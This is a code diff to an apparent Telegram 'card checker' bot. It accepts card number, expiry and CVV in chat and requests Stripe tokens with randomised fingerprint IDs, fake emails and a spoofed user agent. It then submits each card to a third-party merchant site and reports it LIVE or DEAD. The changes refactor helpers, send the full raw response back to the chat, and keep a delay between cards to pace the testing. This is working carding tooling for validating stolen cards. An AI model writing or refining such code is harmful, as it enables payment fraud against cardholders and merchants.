@@ -31,9 +31,9 @@ def parse_card_input(text):
     return cc, mm.zfill(2), yy, cvv
 
 def check_card(cc, mm, yy, cvv):
-    guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
-    muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
-    sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
+    guid = generate_random_string(32)
+    muid = generate_random_string(32)
+    sid = generate_random_string(32)
     time_on_page = str(random.randint(10000, 99999))
     payment_user_agent = "stripe.js/78ef418"
     email = generate_random_email()
@@ -70,7 +70,7 @@ def check_card(cc, mm, yy, cvv):
         "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/130.0.6723.37 Mobile/15E148 Safari/604.1"
     }
     try:
-        stripe_resp = requests.post("https://api.stripe.com/v1/tokens", data=stripe_data, headers=stripe_headers)
+        stripe_resp = requests.post(STRIPE_URL, data=stripe_data, headers=stripe_headers)
         stripe_json = stripe_resp.json()
         stripe_token = stripe_json.get("id", "")
         if not stripe_token or not stripe_token.startswith("tok_"):
@@ -112,12 +112,13 @@ def check_card(cc, mm, yy, cvv):
     try:
         web_resp = requests.post(EIGHTAMWEB_URL, data=web_data, headers=web_headers)
         text = web_resp.text
-        if "Payment Failed" in text:
-            return f"❌ DEAD: {cc}|{mm}|{yy}|{cvv} (Payment Failed)"
-        else:
-            return f"✅ LIVE: {cc}|{mm}|{yy}|{cvv}"
+        status = "✅ LIVE" if "Payment Failed" not in text else "❌ DEAD (Payment Failed)"
+        # Send status + full raw response
+        return f"{status}: {cc}|{mm}|{yy}|{cvv}\n\nFull Response:\n{text}"
     except Exception as e:
         return f"❌ 8amweb error: {str(e)}"
+
+STRIPE_URL = "https://api.stripe.com/v1/tokens"
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
@@ -141,6 +142,7 @@ def card_handler(message):
             continue
         cc, mm, yy, cvv = parsed
         result = check_card(cc, mm, yy, cvv)
+        # Send full response (can be long)
         bot.send_message(message.chat.id, result)
         time.sleep(10)  # 10 seconds delay between cards
 
